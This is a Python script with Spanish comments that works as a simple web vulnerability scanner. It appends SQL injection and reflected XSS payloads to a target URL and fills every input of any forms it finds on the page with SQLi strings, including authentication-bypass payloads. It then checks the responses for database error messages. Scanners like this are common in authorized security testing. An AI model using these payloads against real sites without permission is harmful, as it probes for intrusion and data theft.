import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin


def iniciar_escaneo_completo(url):
    resultados = []
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'}

    print(f"\n[+] Iniciando escaneo avanzado (Fuzzing) en: {url}")

    # --- 1. DICCIONARIOS DE PAYLOADS (FUZZING) ---
    # Diferentes formas de romper una base de datos
    payloads_sqli = [
        "'",                  # Rompe sintaxis básica
        "admin'",             # Rompe sintaxis de usuarios
        "' OR '1'='1",        # Bypass clásico de autenticación
        "' OR 1=1--",         # Bypass con comentario SQL
        "\" OR \"1\"=\"1",    # Bypass con comillas dobles
        "1' ORDER BY 1--"     # Detección de columnas
    ]

    # Diferentes formas de inyectar JavaScript
    payloads_xss = [
        "<script>alert('XSS')</script>",             # Básico
        # Cerrando etiquetas previas
        "\"><script>alert('XSS')</script>",
        # Sin usar la etiqueta script
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"                  # Usando vectores gráficos
    ]

    # Ampliamos los errores que detectamos (incluyendo Oracle y PostgreSQL)
    errores_sql = ["mysql", "syntax", "error in your sql",
                   "warning:", "exception", "java.sql", "ora-", "postgresql"]

    # --- PRUEBA 1: SQL Injection Avanzado (GET) ---
    print("[*] Ejecutando Fuzzing de SQLi por URL...")
    for payload in payloads_sqli:
        url_sqli = url + payload
        try:
            res = requests.get(url_sqli, headers=headers, timeout=20)
            if any(error in res.text.lower() for error in errores_sql):
                print(f">>> 🔴 ¡SQLi detectado con el payload: {payload}")
                # Guardamos qué payload específico funcionó
                resultados.append(
                    {"tipo": f"SQL Injection (URL) - {payload}", "severidad": "Alta"})
                break  # Si ya encontró un hueco, deja de atacar esta ruta para no saturar la tabla
        except:
            pass

    # --- PRUEBA 2: XSS Avanzado (GET) ---
    print("[*] Ejecutando Fuzzing de XSS por URL...")
    for payload in payloads_xss:
        url_xss = url + payload
        try:
            res = requests.get(url_xss, headers=headers, timeout=20)
            if payload in res.text:
                print(f">>> 🟡 ¡XSS detectado con el payload: {payload}")
                resultados.append(
                    {"tipo": "XSS Reflejado (URL)", "severidad": "Media"})
                break
        except:
            pass

    # --- PRUEBA 3: ESCANEO DE FORMULARIOS AVANZADO (POST) ---
    print("[*] Buscando y atacando formularios con Fuzzing...")
    try:
        res = requests.get(url, headers=headers, timeout=20)
        soup = BeautifulSoup(res.text, "html.parser")
        formularios = soup.find_all("form")

        if formularios:
            for form in formularios:
                action = form.get("action")
                target_url = urljoin(url, action) if action else url
                inputs = form.find_all("input")

                vulnerabilidad_encontrada = False

                # Probamos cada payload de nuestra lista en las cajitas del formulario
                for payload in payloads_sqli:
                    datos_falsos = {}
                    for inp in inputs:
                        nombre = inp.get("name")
                        if nombre:
                            datos_falsos[nombre] = payload

                    res_post = requests.post(
                        target_url, data=datos_falsos, headers=headers, timeout=20)

                    if any(error in res_post.text.lower() for error in errores_sql):
                        print(
                            f">>> 🔴 ¡SQLi en Formulario detectado con: {payload}")
                        resultados.append(
                            {"tipo": "SQL Injection en Formulario (POST)", "severidad": "Alta"})
                        vulnerabilidad_encontrada = True
                        break

                if vulnerabilidad_encontrada:
                    break
        else:
            print("[*] No hay formularios en esta página.")
    except Exception as e:
        print(f"[-] Error al analizar formularios: {e}")

    # --- RESULTADO FINAL ---
    if not resultados:
        print("[!] Fin del escaneo: Ninguna detectada.")
        resultados.append({"tipo": "Ninguna detectada", "severidad": "Baja"})

    return resultados
